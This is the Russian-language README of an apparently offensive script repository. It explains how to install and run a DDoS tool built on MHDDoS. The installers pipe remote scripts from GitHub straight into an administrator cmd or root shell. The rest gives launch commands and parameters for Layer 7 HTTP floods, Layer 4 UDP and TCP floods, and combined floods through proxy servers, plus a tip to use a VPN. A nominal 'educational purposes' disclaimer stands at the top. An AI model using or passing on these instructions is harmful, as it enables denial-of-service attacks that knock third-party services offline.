# scripts


                                          ❗❗❗❗❗ДИСКЛЕЙМЕР❗❗❗❗❗
                                  ❗Данный софт предоставлен в ознакомительных целях. ❗
                                  ❗Автор не несёт ни какой ответственности за выполняемый код.❗
                                  ❗Все действия вы производите на свой страх и риск.❗



Для установки на Windows:
1) Запустите cmd от администратора
2) Выполните команду  curl -s https://raw.githubusercontent.com/mr-kritik/scripts/main/install.bat | cmd

Для установки на Kali Linux :
1) Открываем консоль
2) sudo su
3) wget -O - https://raw.githubusercontent.com/mr-kritik/scripts/main/start_install_linux.sh | sh


Дождитесь полной установки!
На Windows будет установлен Docker, Python v.3, Git + сам софт для атаки.
На Linux будет установлено wget, Python v.3, git, Docer + сам софт для атаки.

На windows создастся папка C:\VZ
На Linux в вашей домашней папке создастся папка VZ

                                                      ЗАПУСК СОФТА
                                        1. Более лояльный, менее агрессивный.
WINDOWS : Запускаем cmd/консоль от администратора/root (sudo su), переходим в папку cd C:\VZ
LINUX : cd $HOME/VZ

WIN LINUX: python3 runner.py <Цель> --http-methods <Метод> -t <Угрозы> --rpc <Подключения> -p <Обновление> --debug



	Где :
		a) Цель – Это ссылка в формате https://example.com
		b) Метод (--http-methods) – Один из методов MHDDoS (CFB, DGB, BYPASS, GET  и т.д., подробнее о методах будет ниже).
		c) Угрозы (-t) – Количество запросов/пакетов на цель (1 ядро = 1000).
		d) Подключения(--rpc) – Количество запросов, отправляемых на 1 прокси-сервер, после чего прокси-сервер транслирует эти запросы на цель.
		f) Обновление (-p) – Период времени в секундах, через который ваше соединение с прокси-серверами будет обновляться (прокси-серверы имеют свойства падать, сбрасывать соединение и т.д.). По умолчанию 900 секунд / 15 минут.
		g) --debug – Нужен для того, чтобы мы видели лог атаки (информация по выводу будет ниже). 


Методы Атаки:

Атака на Layer 7 (HTTP(S) по URL) 

python3 runner.py https://example.com https://example1.com -t 1000 --debug

Атака на Layer 7 (HTTP по IP + PORT)
python3 runner.py 192.168.2.1:443 192.168.1.1:80 -t 1000 --debug

Атака на Layer 4 (по UDP адресам)
ВНИМАНИЕ НУЖНО ВПН ПОДКЛЮЧЕНИЕ!!!!!!!!!
python3 runner.py udp://192.168.2.10:53 -t 1000 --debug

Комбинированая атака
python3 runner.py tcp://192.168.2.10:53 https://example1.com 




Вывод из атаки :
PPS - количество установленных соединений с целью атаки
BPS - вес пакетов в байтах, килобайтах, мегабайтах. Оптимально в районе 500 Кб. Может быть и меньше, а может быть гораздо больше. Главное не = 0
% - когда произойдёт смена прокси в %
